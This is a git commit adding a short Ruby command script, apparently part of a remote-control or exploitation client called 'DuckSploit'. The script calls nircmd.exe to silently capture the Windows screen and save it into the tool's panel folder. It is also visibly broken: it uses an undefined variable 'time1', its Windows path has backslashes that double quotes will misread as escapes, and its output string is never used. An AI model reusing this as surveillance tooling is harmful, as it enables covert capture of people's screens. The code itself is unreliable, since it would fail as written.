3135da28a1ecf0d083a0bbc084439a78ae8fc36e
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2022-04-08 18:52:45 +0200

    Create screenshot.rb

---
+++ client/scripts/ruby/commands/screenshot.rb
@@ -0,0 +1,8 @@
+require "colorize"
+
+time = Time.new
+filename = "screenshot-#{time1.inspect}"
+
+system("%windir%\System32\nircmd.exe savescreenshot C:\$DuckSploitw\pannel\#{filename}.png")
+
+out = "Saved as".red.bold.blink
